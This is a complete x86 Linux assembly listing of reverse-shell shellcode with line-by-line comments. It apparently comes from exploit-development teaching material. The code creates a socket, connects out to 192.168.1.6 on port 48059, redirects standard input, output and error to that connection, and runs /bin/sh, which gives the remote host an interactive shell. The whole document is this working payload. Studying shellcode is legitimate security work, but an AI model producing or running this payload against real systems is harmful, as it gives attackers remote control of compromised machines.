BITS 32
section .text
global _start
_start:
xor eax, eax	; clear eax
xor ebx, ebx	; clear ebx
xor edx, edx	; clear edx

; server=socket(2,1,0)
push eax	; third arg to socket: 0
push byte 0x1	; second arg to socket: 1
push byte 0x2	; first arg to socket: 2
mov ecx, esp	; set addr of array as 2nd arg to socketcall
inc bl		; set first arg to socketcall to #1
mov al,102	; call socketcall #1: SYS_SOCKET
int 0x80	; jump into kernel mode, execute the syscall
mov esi, eax	; store the return value (eax) into esi (server)

; client=connect(server,(struct sockaddr *)&serv_addr,0x10)
push edx		; still zero, terminate the next value pushed
push long 0x0601A8C0	; push the address, 192.168.1.6
push word 0xBBBB	; push the port onto the stack, 48059 
xor ecx, ecx		; clear ecx to hold the sa_family field of struc
mov cl, 2		; move single byte:2 to the low order byte of ecx
push word cx		; build struct, use port,sin.family:0002 4 bytes
mov ecx, esp		; move addr struct (on stack) to ecx
push byte 0x10		; beginn the connect args, push 16 stack
push ecx		; save address of struct back on stack
push esi		; save server file descriptor (esi) to stack
mov ecx, esp		; store ptr to args to ecx (2nd arg of socketcall)
mov bl, 3		; set bl to #3, first arg of socketcall
mov al, 102		; call socketcall #3: SYS_CONNECT
int 0x80		; jump into kernel mode, execute the syscall

; prepare for dup2 commands, need client file handle saved in ebx
mov ebx, esi	; copied soc file descriptor of client to ebx

; dup2(soc, 0)
xor ecx, ecx	; clear ecx
mov al, 63	; set first arg of syscall to 63: dup2
int 0x80	; jump into kernel mode, execute the syscall

; dup2(soc, 1)
inc ecx	 	; increment ecx to 1
mov al, 63	; prepare for syscall to dup2: 63
int 0x80	; jump into kernel mode, execute the syscall

; dup2(soc, 2)
inc ecx		; increment ecx to 2
mov al, 63	; prepare for syscall to dup2: 63
int 0x80	; jump into kernel mode, execute the syscall

; standard execve("/bin/sh")
push edx
push long 0x68732f2f
push long 0x6e69622f
mov ebx, esp
push edx
push ebx
mov ecx, esp
mov al, 0x0b
int 0x80	
